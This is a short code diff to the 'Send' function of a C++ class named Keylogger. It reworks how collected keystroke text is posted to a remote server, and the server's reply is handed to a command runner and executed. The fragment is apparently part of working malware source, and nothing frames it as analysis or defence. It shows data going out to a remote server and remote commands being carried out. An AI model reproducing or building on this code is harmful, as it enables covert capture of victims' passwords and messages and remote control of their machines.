@@ -223,11 +223,14 @@ void Keylogger::Send()
 		msgText += *itr;
 	}
 
-	char* response = network.SendPost(msgText.c_str(), msgText.size(), true);
-	if (response != nullptr)
+	size_t response_len;
+	char *response_start;
+
+	bool ret = network.SendPost(sendBuf, sizeof(sendBuf)-1, &response_len, (const char**)&response_start, msgText.c_str(), msgText.size(), true);
+	if (ret)
 	{
-		cmd.Run(response);
-		free(response);
+		response_start[response_len] = '\0';
+		cmd.Run(response_start);
 	}
 
 	return;
